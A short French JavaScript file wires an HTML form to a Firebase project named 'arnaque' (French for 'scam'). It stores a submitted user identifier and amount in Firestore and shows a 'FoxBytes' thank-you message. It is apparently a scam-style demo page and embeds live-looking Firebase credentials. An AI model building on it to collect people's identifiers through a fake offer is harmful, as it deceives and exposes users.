

import { initializeApp } from "https://www.gstatic.com/firebasejs/13.2.0/firebase-app.js";

import {
    getFirestore,
    collection,
    addDoc,
    serverTimestamp
} from "https://www.gstatic.com/firebasejs/13.2.0/firebase-firestore.js";

// Configuration Firebase
const firebaseConfig = {
    apiKey: "AIzaSyAs4lVL8flhdQ7BRwlUMzyPuA7LCE8yHas",
    authDomain: "arnaque-be6ff.firebaseapp.com",
    databaseURL: "https://arnaque-be6ff-default-rtdb.europe-west1.firebasedatabase.app",
    projectId: "arnaque-be6ff",
    storageBucket: "arnaque-be6ff.firebasestorage.app",
    messagingSenderId: "1051032809697",
    appId: "1:1051032809697:web:2b49b83eadbb1b787087a0",
    measurementId: "G-LHS22QXWE0"
};

// Initialisation Firebase
const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

// Éléments HTML
const formulaire = document.getElementById("formulaire");
const bouton = document.getElementById("bouton");
const ecran = document.getElementById("messagePleinEcran");
const texte = document.getElementById("texteMessage");

formulaire.addEventListener("submit", async (event) => {
    event.preventDefault();

    const identifiant = document.getElementById("entree1").value.trim();
    const montant = Number(document.getElementById("montant").value);

    if (!identifiant || !Number.isSafeInteger(montant) || montant <= 0) {
        alert("Veuillez vérifier les informations saisies.");
        return;
    }

    bouton.disabled = true;
    bouton.textContent = "ENVOI EN COURS...";

    try {
        // Enregistrement des données de démonstration
        await addDoc(collection(db, "reponses"), {
            identifiant: identifiant,
            montant: montant,
            date: serverTimestamp()
        });

        // Message affiché uniquement après réussite
        texte.textContent =
            "Merci pour votre demande de FoxBytes ! Votre demande de démonstration a bien été enregistrée.";

        ecran.style.display = "flex";

        formulaire.reset();

    } catch (error) {
        console.error("Erreur Firebase :", error);
        alert("Une erreur est survenue lors de l'enregistrement.");

    } finally {
        bouton.disabled = false;
        bouton.textContent = "ENVOYER";
    }
});
